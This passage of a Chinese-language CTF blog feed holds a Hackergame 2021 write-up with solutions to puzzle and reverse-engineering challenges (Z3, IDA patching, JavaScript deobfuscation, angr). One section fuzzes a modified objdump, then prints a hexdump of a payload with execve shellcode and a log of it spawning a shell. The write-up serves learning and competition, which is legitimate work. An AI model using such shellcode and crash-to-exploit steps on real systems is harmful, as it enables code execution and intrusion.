class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">134</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">144</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">142</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">100</span>, <span class="number">142</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">142</span>, <span class="number">142</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">59</span>, <span class="number">142</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">coefficients = np.zeros([<span class="number">144</span>, <span class="number">144</span>])   <span class="comment"># each row represents 144 variable</span></span><br><span class="line">variables = [BitVec(<span class="string">&#x27;x_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i), <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">144</span>)]   <span class="comment"># much faster than using Int()...</span></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate the coefficients matrix</span></span><br><span class="line"><span class="comment">#           1</span></span><br><span class="line"><span class="comment">#           2</span></span><br><span class="line"><span class="comment">#       1 2 3 2 1</span></span><br><span class="line"><span class="comment">#           2</span></span><br><span class="line"><span class="comment">#           1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j] = <span class="number">3</span>            <span class="comment"># click this button </span></span><br><span class="line">        <span class="keyword">if</span> j+<span class="number">1</span> &lt; <span class="number">12</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j+<span class="number">1</span>] = <span class="number">2</span>      <span class="comment"># click the next one</span></span><br><span class="line">        <span class="keyword">if</span> j-<span class="number">1</span> &gt;= <span class="number">0</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j-<span class="number">1</span>] = <span class="number">2</span>      <span class="comment"># click the previous one</span></span><br><span class="line">        <span class="keyword">if</span> j+<span class="number">2</span> &lt; <span class="number">12</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j+<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j-<span class="number">2</span> &gt;= <span class="number">0</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (i+<span class="number">1</span>) &lt; <span class="number">12</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][(i+<span class="number">1</span>)*<span class="number">12</span>+j] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (i-<span class="number">1</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][(i-<span class="number">1</span>)*<span class="number">12</span>+j] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (i+<span class="number">2</span>) &lt; <span class="number">12</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][(i+<span class="number">2</span>)*<span class="number">12</span>+j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (i-<span class="number">2</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][(i-<span class="number">2</span>)*<span class="number">12</span>+j] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">expression = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">144</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">144</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">144</span>):</span><br><span class="line">            expression[i] += <span class="built_in">int</span>(coefficients[i][j]) * variables[j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        s.add(expression[i*<span class="number">12</span>+j] == result[i][j])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p><s>解完之后只要一个一个用手点就好了</s></p><h2 id="只读文件系统">只读文件系统</h2><p>这个问题一开始想直接绕过<code>chroot</code>，最后以失败告终了，然后就到了看题解“Ohhh”的阶段了</p><h2 id="卷王与野生的-GPA">卷王与野生的 GPA</h2><p>这个很好玩，直接把ELF拖进IDA发现，有一个<code>decrypt</code>函数在解密<code>flag</code>，其后面跟着的代码和<code>showtext</code>的十分接近（猜测是用来刷新的？），那么只要找一个位置调用一下即可，个人选择的是先patch init里的给球赋值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080004E0 init                                    ; CODE XREF: main:loc_80005DE↓p</span><br><span class="line">.text:080004E0                 MOVS    R2, #1 &lt;--- Patch here</span><br><span class="line">.text:080004E2                 PUSH    &#123;R3-R7,LR&#125;</span><br></pre></td></tr></table></figure><p>然后修改一下trickplay</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0800049C                 EXPORT trickplay</span><br><span class="line">.text:0800049C trickplay                               ; CODE XREF: main:loc_80005F8↓p</span><br><span class="line">.text:0800049C                 PUSH    &#123;R4,LR&#125;</span><br><span class="line">.text:0800049E                 LDR     R0, =trick0</span><br><span class="line">.text:080004A0                 BL      decrypt &lt;--- Patch here</span><br></pre></td></tr></table></figure><p>至于为什么不直接decrypt，因为这样子可以抛一次球（）<br><img src="gpa.png" alt="GPA"></p><h2 id="助记词">助记词</h2><h3 id="第一顿大餐">第一顿大餐</h3><p>注意到延时在<code>equal()</code>中，我们想办法去让这个函数被调用就可以了。数据被储存在<code>HashMap</code>里，假如我们让每一个数据的hash相等，这个时候就需要去判断对应index的数据是否相等，就会调用<code>equal()</code>触发延时，一次发送32条数据，足够完成第一个问题了</p><h2 id="minecRaft">minecRaft</h2><p>实际上是个逆向题，做的时候直接就去分析js了（（（）））花点时间慢慢分析就好了，以下是一些简单的反混淆</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 这个函数执行输入的处理，将输入字符串切分，四个一组，两两用 code() 进行运算</span></span><br><span class="line">    <span class="comment">// 这里的部分常量是直接在浏览器console里面获得的，实在是没心情看这份代码了（）</span></span><br><span class="line">    <span class="built_in">String</span>.prototype[get_string_from_array(<span class="number">0x1a8</span>)<span class="comment">/*encrypt*/</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> _0x13519e = get_string_from_array,</span><br><span class="line">            new_arr_1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x2</span>),</span><br><span class="line">            new_arr_2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> _0x1bf548 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        plaintext = <span class="built_in">escape</span>(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// input = &#x27;1356853149054377&#x27;</span></span><br><span class="line">        <span class="comment">// new_arr_2[0] = 909456177</span></span><br><span class="line">        <span class="comment">// new_arr_2[1] = 825439544</span></span><br><span class="line">        <span class="comment">// new_arr_2[2] = 892352820</span></span><br><span class="line">        <span class="comment">// new_arr_2[3] = 926364468</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; <span class="number">0x4</span>; i++)</span><br><span class="line">            new_arr_2[i] = Str4ToLong(input[<span class="string">&#x27;slice&#x27;</span>](i * <span class="number">0x4</span>, (i + <span class="number">0x1</span>) * <span class="number">0x4</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0x0</span>; i &lt; plaintext[<span class="string">&#x27;length&#x27;</span>]; i += <span class="number">0x8</span>) &#123;</span><br><span class="line">            new_arr_1[<span class="number">0x0</span>] = Str4ToLong(plaintext.slice(i, i + <span class="number">0x4</span>)),</span><br><span class="line">            new_arr_1[<span class="number">0x1</span>] = Str4ToLong(plaintext[<span class="string">&#x27;slice&#x27;</span>](i + <span class="number">0x4</span>, i + <span class="number">0x8</span>)),</span><br><span class="line">            code(new_arr_1, new_arr_2),</span><br><span class="line">            _0x1bf548 += LongToBase16(new_arr_1[<span class="number">0x0</span>]) + LongToBase16(new_arr_1[<span class="number">0x1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c</span></span><br><span class="line">        <span class="keyword">return</span> _0x1bf548;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行输入变换的函数，_0x50051f(0x1aa)的输出就是 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gyflagh</span>(<span class="params">input_flag</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> _0x50051f = _0x22517d;</span><br><span class="line">    <span class="keyword">let</span> _0x3b790d = input_flag[<span class="string">&#x27;encrypt&#x27;</span>](<span class="string">&#x27;1356853149054377&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (_0x3b790d === _0x50051f(<span class="number">0x1aa</span>)) <span class="comment">// 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，我们只要将<code>code()</code>里的计算给反过来就可以完成了解密了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">input_arr_1, input_arr_2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> value_1 = input_arr_1[<span class="number">0x0</span>], <span class="comment">// 0,1,2,3, str2long</span></span><br><span class="line">        value_2 = input_arr_1[<span class="number">0x1</span>]; <span class="comment">// 4,5,6,7, str2long</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> constant_1 = (<span class="number">0x52cfb2de</span> + <span class="number">0x4b67c6db</span>), <span class="comment">// 2654435769</span></span><br><span class="line">        e1 = constant_1 * <span class="number">0x20</span>;            <span class="comment">// 84941944608</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> v1 = e1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (v1 != <span class="number">0x0</span>) &#123;</span><br><span class="line">        value_2 -= (value_1 &lt;&lt; <span class="number">0x4</span> ^ value_1 &gt;&gt;&gt; <span class="number">0x5</span>) + value_1 ^ v1 + input_arr_2[v1 &gt;&gt;&gt; <span class="number">0xb</span> &amp; <span class="number">0x3</span>];</span><br><span class="line">        v1 -= constant_1;</span><br><span class="line">        value_1 -= (value_2 &lt;&lt; <span class="number">0x4</span> ^ value_2 &gt;&gt;&gt; <span class="number">0x5</span>) + value_2 ^ v1 + input_arr_2[v1 &amp; <span class="number">0x3</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    input_arr_1[<span class="number">0x0</span>] = value_1,</span><br><span class="line">        input_arr_1[<span class="number">0x1</span>] = value_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_arr_1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x2</span>);</span><br><span class="line">new_arr_2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x4</span>);</span><br><span class="line">new_arr_2[<span class="number">0</span>] = <span class="number">909456177</span></span><br><span class="line">new_arr_2[<span class="number">1</span>] = <span class="number">825439544</span></span><br><span class="line">new_arr_2[<span class="number">2</span>] = <span class="number">892352820</span></span><br><span class="line">new_arr_2[<span class="number">3</span>] = <span class="number">926364468</span></span><br><span class="line">res=<span class="string">&quot;&quot;</span></span><br><span class="line">text =<span class="string">&quot;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&quot;</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0x0</span>; i &lt; text[<span class="string">&#x27;length&#x27;</span>]; i += <span class="number">16</span>) &#123;</span><br><span class="line">    new_arr_1[<span class="number">0x0</span>] = Base16ToLong(text.slice(i, i + <span class="number">0x8</span>)),</span><br><span class="line">        new_arr_1[<span class="number">0x1</span>] = Base16ToLong(text[<span class="string">&#x27;slice&#x27;</span>](i + <span class="number">0x8</span>, i + <span class="number">16</span>)),</span><br><span class="line">        decode(new_arr_1, new_arr_2),</span><br><span class="line">        res += LongToStr4(new_arr_1[<span class="number">0x0</span>]) + LongToStr4(new_arr_1[<span class="number">0x1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(res);</span><br></pre></td></tr></table></figure><p>以上内容直接复制到console里面就能看到答案</p><h2 id="fzuu">fzuu</h2><p>属于看到题目长度就开始摆烂啥都没做最后发现其实很简单的一个了，首先按照提示用AFL fuzz objdump，大概五六分钟就可以得到一个crash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿k)-[~/Desktop/fzuu]</span><br><span class="line">└─$ hexdump -C out/crashes/id:000001,sig:04,src:000375,op:flip1,pos:2 </span><br><span class="line">00000000  53 31 30 30 30 22 ff ff  33 33 33 33 33 33 33 ff  |S1000&quot;..3333333.|</span><br><span class="line">00000010  30 30 30 1c ec 50 30 c5  c5 c5 c5 c5 b3 c5 c5 c5  |000..P0.........|</span><br><span class="line">00000020  c5 c5 c5 c5 c5 c5 c5 c5  c5 c5 33 33 33 33 33 33  |..........333333|</span><br><span class="line">00000030  00 0d 7f ff 30 30 30 30  16 30 30 30 30 30 30 30  |....0000.0000000|</span><br><span class="line">00000040  ff ff 33 ea 00 1c e8 49                           |..3....I|</span><br><span class="line">00000048</span><br></pre></td></tr></table></figure><p>连上调试器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ set args -d out/crashes/id:000001,sig:04,src:000375,op:flip1,pos:2</span><br><span class="line"></span><br><span class="line">.........</span><br><span class="line"></span><br><span class="line">RBP: 0x7fffffffd970 --&gt; 0x7fffffffdac0 --&gt; 0x7fffffffdb00 --&gt; 0x7fffffffdca0 --&gt; 0x7fffffffdcd0 --&gt; 0x7fffffffdd10 (--&gt; ...)</span><br><span class="line">RSP: 0x7fffffffd8c8 --&gt; 0x55555564d8b5 (&lt;srec_scan_helper+117&gt;:nop)</span><br><span class="line">RIP: 0x7fffffffd900 --&gt; 0x333333333333ffff </span><br></pre></td></tr></table></figure><p>注意到RIP，可以发现，它大概是直接执行了这个文件的ff ff  33 33 33 33 33 33 33处的内容，直接找一个shellcode复制进去试试(<a href="http://shell-storm.org/shellcode/files/shellcode-806.php">http://shell-storm.org/shellcode/files/shellcode-806.php</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿k)-[~/Desktop/fzuu]</span><br><span class="line">└─$ hexdump -C payload</span><br><span class="line">00000000  53 31 30 30 30 22 31 c0  48 bb d1 9d 96 91 d0 8c  |S1000&quot;1.H.......|</span><br><span class="line">00000010  97 ff 48 f7 db 53 54 5f  99 52 57 54 5e b0 3b 0f  |..H..ST_.RWT^.;.|</span><br><span class="line">00000020  05                                                |.|</span><br><span class="line">00000021</span><br><span class="line"></span><br><span class="line"># shellcode starts from 31 c0 48...</span><br><span class="line"></span><br><span class="line">┌──(kali㉿k)-[~/Desktop/fzuu]</span><br><span class="line">└─$ ./objdump_afl -d payload</span><br><span class="line">$ uname -a</span><br><span class="line">Linux bad 5.10.0-kali7-amd64 #1 SMP Debian 5.10.28-1kali1 (2021-04-12) x86_64 GNU/Linux</span><br><span class="line">$ </span><br></pre></td></tr></table></figure><p>然后就，结束了，就很简单，既然都到这里了，那我们不妨简单看一下为什么会出现这样的问题，直接定位到<code>srec_scan_helper</code>看看先<br><img src="r2.png" alt="srec_scan_helper"><br>很明显，从文件中读入数据，然后一个<code>rdx()</code>直接执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000FA329 loc_FA329:                              ; CODE XREF: srec_scan+96D↑j</span><br><span class="line">.text:00000000000FA329                 cmp     dword ptr [rbp-114h], 0FFFFFFFEh</span><br><span class="line">.text:00000000000FA330                 jnz     short loc_FA367</span><br></pre></td></tr></table></figure><p>然而在前面的<code>case</code>中，<code>bytes</code>从1减到0又-2了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">check_sum += HEX (data);</span><br><span class="line">address = (address &lt;&lt; <span class="number">8</span>) | HEX (data);</span><br><span class="line">data += <span class="number">2</span>;</span><br><span class="line">check_sum += HEX (data);</span><br><span class="line">address = (address &lt;&lt; <span class="number">8</span>) | HEX (data);</span><br><span class="line">data += <span class="number">2</span>;</span><br><span class="line">bytes -= <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>，这里正好满足条件</p><h2 id="外星人的音游掌机">外星人的音游掌机</h2><p>根据提示，去装上icebox等等相关工具，开始分析</p><h2 id="超-OI-的-Writeup-模拟器">超 OI 的 Writeup 模拟器</h2><h3 id="果然还是逆向比较简单，这次没人两小时手做了吧">果然还是逆向比较简单，这次没人两小时手做了吧</h3><p>第一问可以手动还原，不难发现，用来计算结果的循环其循环次数只和输入的前两个参数有关，并且前两个参数都是常量，那么我们就能从结果为0一步一步往上倒推得到答案</p><p>当然也可以直接符号执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>():</span></span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;./0.bin&#x27;</span>)</span><br><span class="line">    flag_chars = [claripy.BVS(<span class="string">&#x27;flag_%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    flag = claripy.Concat(*flag_chars+[claripy.BVV(<span class="string">b&#x27;\n&#x27;</span>)])</span><br><span class="line"></span><br><span class="line">    init_state = proj.factory.entry_state(stdin=flag)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> flag_chars:</span><br><span class="line">        init_state.solver.add(k &lt;= <span class="number">126</span>)</span><br><span class="line">        init_state.solver.add(k &gt;= <span class="number">35</span>)</span><br><span class="line"></span><br><span class="line">    simulation = proj.factory.simgr(init_state)</span><br><span class="line">    simulation.explore(find=<span class="keyword">lambda</span> s: <span class="string">b&quot;Correct code&quot;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> solution <span class="keyword">in</span> simulation.found:</span><br><span class="line">        <span class="built_in">print</span>(solution.posix.dumps(<span class="number">0</span>), solution.posix.dumps(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_key()</span><br></pre></td></tr></table></figure><p>以上脚本对于前两个问题都可以比较快求出解，摆烂摆出前两题。到第三问跑了一会实在不行了，选择放弃！</p><p><em>结束之后发现好像要写比较多代码的题目都懒得做了直接跳过了（）</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Hackergame 2021&lt;/h1&gt;
&lt;p&gt;a brief writeup&lt;/p&gt;
&lt;!-- TOC --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#hackergame-2021&quot;&gt;Hackergame 2021&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://kpwnz.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Finally switch to Hexo...</title>
    <link href="https://kpwnz.github.io/2021/11/03/hello-world/"/>
    <id>https://kpwnz.github.io/2021/11/03/hello-world/</id>
    <published>2021-11-03T07:41:32.226Z</published>
    <updated>2021-11-03T09:28:59.679Z</updated>
    
    
    
    
    
  </entry>
  
</feed>
